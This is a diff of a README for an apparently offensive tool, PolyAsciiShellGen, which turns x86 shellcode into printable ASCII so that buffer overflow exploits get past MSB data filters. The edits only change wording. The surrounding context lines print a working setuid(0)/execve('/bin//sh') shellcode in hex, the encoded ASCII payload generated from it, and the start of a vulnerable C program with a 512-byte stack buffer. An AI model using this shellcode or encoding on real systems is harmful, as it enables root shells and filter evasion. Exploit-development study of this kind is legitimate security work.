@@ -1,7 +1,7 @@
 # PolyAsciiShellGen (x86, 32 bits)
 ## Polymorphic Ascii Shellcode Generator to bypass MSB data filters for buffer overflow exploits on Intel platforms.
 
-More information about this technique on the Riley "caezar" Eller publication:
+More information about this technique on the Riley Eller "caezar" publication:
 
 [http://julianor.tripod.com/bc/bypass-msb.txt](http://julianor.tripod.com/bc/bypass-msb.txt)
 
@@ -18,14 +18,14 @@ usage: PolyAsciiShellGen <esp offset> <nop sleed factor N * 4 NOPS> <shellcode "
 
 ```
 
-Example with a setuid(0) & execve(/bin//sh,0,0) shellcode:
+Example with a setuid(0) and execve(/bin//sh,0,0) shellcode:
 ```
 # ./PolyAsciiShellGen -270 10 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
 TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP
 
 ```
 
-Injection in a vulnerable program in a buffer of 512 bytes:
+Injection in a vulnerable program in a stack buffer of 512 bytes:
 ```
 #include <string.h>
 #include <stdio.h>
